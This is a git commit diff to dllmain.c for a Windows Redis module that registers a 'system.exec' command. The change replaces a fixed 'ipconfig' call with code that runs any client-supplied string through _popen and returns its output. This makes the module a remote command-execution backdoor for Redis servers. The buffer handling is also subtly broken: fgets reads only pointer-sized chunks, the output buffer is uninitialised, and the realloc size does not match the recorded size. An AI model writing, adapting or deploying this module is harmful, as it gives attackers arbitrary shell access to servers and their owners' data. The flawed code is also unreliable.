4fbcbd494abac5f6eaa76739dc161acd0913a103
learner-ing <58681115+learner-ing@users.noreply.github.com>
2021-10-31 13:40:38 +0800

    Update dllmain.c

--- dllmain.c
+++ dllmain.c
@@ -1,12 +1,35 @@
-﻿#define _CRT_SECURE_NO_WARNINGS
 #include "pch.h"
 #include "redismodule.h"
 #include <stdio.h>
+
+
 __declspec(dllexport) int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc);
 
 int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
-	system("ipconfig >c:\\programdata\\a.txt");
+	if (argc == 2) {
+		size_t cmd_len;
+		size_t size = 1024;
+		char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
+		FILE *fp = _popen(cmd, "r");
+		char *buf, *output;
+		buf = (char *)malloc(size);
+		output = (char *)malloc(size);
+		while (fgets(buf, sizeof(buf), fp) != 0) {
+			if (strlen(buf) + strlen(output) >= size) {
+				output = realloc(output, size << 2);
+				size <<= 1;
+			}
+			strcat_s(output,size, buf);
+		}
+		RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
+		RedisModule_ReplyWithString(ctx, ret);
+		_pclose(fp);
+	}
+	else {
+		return RedisModule_WrongArity(ctx);
+	}
 	return REDISMODULE_OK;
+
 }
 
 int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
@@ -14,7 +37,7 @@ int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) 
 		== REDISMODULE_ERR) return REDISMODULE_ERR;
 
 	if (RedisModule_CreateCommand(ctx, "system.exec",
-		DoCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
+		DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
 		return REDISMODULE_ERR;
 	return REDISMODULE_OK;
 }
